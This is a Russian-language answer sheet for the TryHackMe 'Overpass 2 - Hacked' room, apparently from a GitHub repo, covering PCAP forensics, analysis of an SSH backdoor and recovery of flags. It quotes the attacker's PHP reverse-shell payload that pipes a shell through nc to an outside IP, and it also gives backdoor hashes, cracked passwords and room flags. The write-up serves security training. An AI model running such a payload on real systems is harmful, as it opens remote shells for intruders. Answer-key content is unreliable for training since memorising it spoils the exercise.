[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Overpass 2 - Hacked](https://tryhackme.com/r/room/overpass2hacked) 

Всего 3 задания:
## Задание 1
Overpass взломан! Команда SOC (Paradox, поздравляем с повышением) заметила подозрительную активность во время ночной 
смены, просматривая шибы, и сумела перехватить пакеты в момент атаки. 

Сможете ли вы выяснить, как злоумышленник проник внутрь, и взломать рабочий сервер Overpass?

Примечание: Хотя эта комната является пошаговым руководством, она предполагает знакомство с инструментами и Linux. Я 
рекомендую изучить основы Wireshark и завершить Linux Fundamentals как минимум. 

md5sum файла PCAP : 11c3b2e9221865580295bc662c35c6dc

### Ответить на вопросы ниже
Какой URL-адрес страницы они использовали для загрузки обратного шелла?
```commandline
/development/
```
Какую полезную нагрузку использовал злоумышленник для получения доступа?
```commandline
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
Какой пароль использовал злоумышленник для доступа?
```commandline
whenevernoteartinstant
```
Как злоумышленнику удалось обеспечить настойчивость?
```commandline
https://github.com/NinjaJc01/ssh-backdoor
```
Сколько системных паролей удалось взломать, используя список слов Fasttrack?
```commandline
4
```

## Задание 2
Теперь, когда вы нашли код бэкдора, пришло время его проанализировать.

Ответить на вопросы ниже
Какой хэш по умолчанию для бэкдора?

```commandline
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```
Какова жестко закодированная соль для бэкдора?
```commandline
1c362db832f3f864c8c2fe05f2002a05
```
Какой хэш использовал злоумышленник? — для этого вернитесь к PCAP!
```commandline
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```
Взломайте хэш с помощью rockyou и инструмента взлома по вашему выбору. Какой пароль?
```commandline
november16
```

## Задание 3
Теперь, когда инцидент расследован, Paradox нужен кто-то, кто снова возьмет под контроль производственный сервер 
Overpass. 

На коробке есть флаги, которые Overpass не может позволить себе потерять, форматируя сервер!

### Ответить на вопросы ниже
Злоумышленник испортил сайт. Какое сообщение он оставил в качестве заголовка?

```commandline
H4ck3d by CooctusClan
```
Используя информацию, которую вы нашли ранее, взломайте систему и вернитесь обратно!
```commandline
Ответ не нужен
```
+ 15
Что такое флаг пользователя?
```commandline
thm{d119b4fa8c497ddb0525f7ad200e6567}
```
+ 20
Что такое корневой флаг?
```commandline
thm{d53b2684f169360bb9606c333873144d}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)